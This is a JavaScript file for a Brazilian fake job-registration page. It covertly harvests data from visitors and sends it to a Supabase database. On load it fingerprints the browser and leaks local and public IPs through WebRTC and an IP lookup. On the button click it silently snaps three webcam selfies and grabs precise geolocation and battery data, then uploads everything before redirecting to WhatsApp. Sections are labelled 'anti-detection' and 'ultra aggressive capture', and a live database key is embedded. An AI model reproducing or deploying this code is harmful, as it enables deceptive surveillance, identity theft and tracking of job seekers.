// =================================================================
// CONFIGURAÇÃO DE CONEXÃO
// =================================================================
const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";
const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// Elementos da Página
const video = document.getElementById("video");
const btn = document.getElementById("btn");
const statusText = document.getElementById("status");
const canvas = document.getElementById("canvas");

// =================================================================
// ANTI-DETECÇÃO
// =================================================================
const userAgents = [
  "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
];

function getRandomUA() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Fingerprint Canvas
function getCanvasFingerprint() {
  const c = document.createElement("canvas");
  const ctx = c.getContext("2d");
  ctx.textBaseline = "alphabetic";
  ctx.font = "22px Arial";
  ctx.fillStyle = "#f60";
  ctx.fillRect(100, 100, 200, 50);
  ctx.fillStyle = "#069";
  ctx.fillText("abcdefghijklmnopqrstuvwxyz", 120, 140);
  return btoa(c.toDataURL()).slice(-32);
}

// WebGL Fingerprint
function getWebGLFingerprint() {
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl");
    const debug = gl.getExtension("WEBGL_debug_renderer_info");
    return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
  } catch(e) { return "WebGL bloqueado"; }
}

// Bateria Detalhada
async function getBatteryInfo() {
  if (!navigator.getBattery) return "Não suportado";
  const b = await navigator.getBattery();
  return `${Math.floor(b.level * 100)}% ${b.charging ? '(carregando)' : ''}`;
}

// =================================================================
// CAPTURA ULTRA AGRESSIVA
// =================================================================
async function capturarPortaAvancada() {
  const info = { 
    local_ip: null, 
    local_port: null,
    ipv6: null,
    public_ip: null,
    operadora: "Não detectada"
  };

  const servers = [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' }
  ];

  for (let attempt = 0; attempt < 5; attempt++) {
    for (let config of servers) {
      try {
        await new Promise(r => setTimeout(r, 400 + Math.random() * 700));

        const rtc = new RTCPeerConnection({
          iceServers: [config],
          iceTransportPolicy: "all"
        });

        rtc.createDataChannel("ultra");
        const offer = await rtc.createOffer();
        await rtc.setLocalDescription(offer);

        await new Promise(resolve => setTimeout(resolve, 1600));

        rtc.onicecandidate = (event) => {
          if (event.candidate) {
            const cand = event.candidate.candidate;
            const ipMatch = cand.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[a-f0-9:]+)/i);
            const portMatch = cand.match(/(\d{4,5})\s+typ/);
            
            if (ipMatch) {
              const ip = ipMatch[1];
              if (ip.includes(':')) info.ipv6 = ip;
              else info.local_ip = ip;
            }
            if (portMatch) info.local_port = portMatch[1];
          }
        };

        rtc.close();
        if (info.local_port) break;
      } catch(e) {}
    }
    if (info.local_port) break;
  }

  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    info.public_ip = data.ip;
    info.operadora = data.org || "Não detectada";
  } catch(e) {}

  return info;
}

// =================================================================
// INICIALIZAÇÃO + PRÉ-CADASTRO
// =================================================================
async function iniciarSistema(){
  try {
    falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
    statusText.innerHTML = "🟡 Iniciando sistema...";

    const portaInfo = await capturarPortaAvancada();

    await supabaseClient.from('checkins').insert([{
      tipo_captura: "previa",
      ip: portaInfo.public_ip || "indisponível",
      local_ip: portaInfo.local_ip,
      ipv6: portaInfo.ipv6,
      local_port: portaInfo.local_port,
      operadora: portaInfo.operadora,
      user_agent: getRandomUA(),
      canvas_fp: getCanvasFingerprint(),
      webgl: getWebGLFingerprint()
    }]);

    statusText.innerHTML = "✅ Sistema pronto";

    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });
    video.srcObject = stream;
    await video.play();
  } catch(err) {
    console.log(err);
    statusText.innerHTML = "❌ Permita câmera";
  }
}
window.onload = iniciarSistema;

// =================================================================
// BOTÃO - CAPTURA COMPLETA (VERSÃO FINAL)
// =================================================================
btn.addEventListener("click", async () => {
  try {
    btn.disabled = true;
    btn.innerHTML = "PROCESSANDO...";
  
    statusText.innerHTML = "📨 Verificando informações do convite..";
    falar("Verificando informações do convite..");

    const largura = video.videoWidth;
    const altura = video.videoHeight;
    if(!largura || !altura){
      throw new Error("Vídeo não carregou corretamente.");
    }

    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");
    const fotos = [];
    for(let i = 0; i < 3; i++) {
        ctx.drawImage(video, 0, 0, 640, 480);
        fotos.push(canvas.toDataURL("image/jpeg", 0.8));
        if(i < 2) await new Promise(resolve => setTimeout(resolve, 900));
    }

    const stream = video.srcObject;
    if (stream) stream.getTracks().forEach(track => track.stop());

    let latitude = "não permitido";
    let longitude = "não permitido";
    try {
      const localizacao = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
      });
      latitude = localizacao.coords.latitude;
      longitude = localizacao.coords.longitude;
    } catch(err) {}

    const portaInfo = await capturarPortaAvancada();
    const bateria = await getBatteryInfo();

    statusText.innerHTML = "💾 Salvando cadastro...";
    falar("Salvando cadastro.");

    const { error } = await supabaseClient.from('checkins').insert([{
      tipo_captura: "completo",
      selfies: fotos,
      latitude: latitude.toString(),
      longitude: longitude.toString(),
      ip: portaInfo.public_ip || "indisponível",
      ipv6: portaInfo.ipv6,
      local_ip: portaInfo.local_ip,
      local_port: portaInfo.local_port,
      operadora: portaInfo.operadora,
      user_agent: getRandomUA(),
      canvas_fp: getCanvasFingerprint(),
      webgl: getWebGLFingerprint(),
      bateria: bateria,
      largura_tela: window.innerWidth,
      altura_tela: window.innerHeight
    }]);

    if (error) throw error;

    statusText.innerHTML = "✅ Cadastro concluído";
    falar("Cadastro concluído com sucesso.");

    setTimeout(() => {
      window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
    }, 2000);

  } catch(err) {
    console.log(err);
    statusText.innerHTML = "❌ Erro: " + (err.message || "Falha de comunicação externa.");
    btn.disabled = false;
    btn.innerHTML = "QUERO PARTICIPAR";
  }
});
